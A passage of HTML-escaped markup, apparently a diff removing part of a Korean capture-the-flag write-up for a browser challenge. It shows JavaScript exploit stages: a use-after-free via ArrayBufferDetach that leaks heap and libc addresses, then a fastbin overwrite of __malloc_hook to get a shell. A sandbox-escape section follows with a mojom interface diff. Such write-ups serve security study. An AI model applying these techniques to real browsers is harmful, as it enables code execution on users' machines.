-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;cm&quot;&gt;/* STAGE 1 */&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;heap : &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])));&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;libc : &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])));&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;array buffer의 backing store가 free될때는 ptmalloc의 free를 사용하기 때문에 heap과 libc주소가 chunk에 남습니다. 따라서 그것을 t1의 backgin store로 가져오게 되면 heap, libc 주소를 릭할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* STAGE 2 */&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;t3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;UAF 취약점이 존재하는 array buffer의 backing store는 calloc으로 할당되기 때문에 tcache를 사용하지 않기 때문에 tcache를 이용한 exploit은 불가능합니다. 그래서 tcache를 전부 채워서 fastbin을 사용하게 한 뒤, fastbin의 fd를 덮어서  &lt;code class=&quot;highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; 을 덮으면 rip를 조작할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;여기서 문제가 되는것은 malloc 호출뒤에 원샷조건이 맞지 않는다는 것인데,  여러가지 javascript 함수를 호출하던 도중 JSON.stringify 함수를 호출했을때 원샷 조건이 맞다는 사실을 깨달았습니다. 그래서 이것을 이용해 쉘을 획득할 수 있었습니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;4-sbx--vulnerability--exploit&quot;&gt;4. SBX : Vulnerability / Exploit&lt;/h1&gt;
-
-&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/third_party/blink/public/mojom/tstorage/tstorage.mojom b/third_party/blink/public/mojom/tstorage/tstorage.mojom
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;new file mode 100644
-&lt;/span&gt;&lt;span class=&quot;gh&quot;&gt;index 000000000000..c6c8c91905c8
-&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- /dev/null
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/third_party/blink/public/mojom/tstorage/tstorage.mojom
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -0,0 +1,20 @@&lt;/span&gt;
-&lt;span class=&quot;gi&quot;&gt;+module blink.mojom;
-+
-+interface TStorage {
-+    Init() =&amp;gt; ();
-+    CreateInstance() =&amp;gt; (pending_remote&amp;lt;blink.mojom.TInstance&amp;gt; instance);
-+    GetLibcAddress() =&amp;gt; (uint64 addr);
-+    GetTextAddress() =&amp;gt; (uint64 addr);
-+};
-+
-+interface TInstance {
-+    Push(uint64 value) =&amp;gt; ();
-+    Pop() =&amp;gt; (uint64 value);
-+    Set(uint64 index, uint64 value) =&amp;gt; ();
-+    Get(uint64 index) =&amp;gt; (uint64 value);
-+    SetInt(int64 value) =&amp;gt; ();
-+    GetInt() =&amp;gt; (int64 value);
-+    SetDouble(double value) =&amp;gt; ();
-+    GetDouble() =&amp;gt; (double value);
-+    GetTotalSize() =&amp;gt; (int64 size);
-+};
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;취약점은 새롭게 추가된 mojo 기능에서 발생합니다. 추가된 기능은 TStorage로, Instance를 생성하여 원하는 값을 넣거나 가져올 수 있습니다. 또한 &lt;code class=&quot;highlighter-rouge&quot;&gt;GetLibcAddress()&lt;/code&gt; 함수와 &lt;code class=&quot;highlighter-rouge&quot;&gt;GetTextAddress()&lt;/code&gt; 함수를 통해 libc 주소와 text base 주소를 가져올 수 있었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TStorageImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateInstanceCallback&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PendingRemote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MakeSelfOwnedReceiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;make_unique&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TInstanceImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner_db_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()),&lt;/span&gt;
-                                &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InitWithNewPipeAndPassReceiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
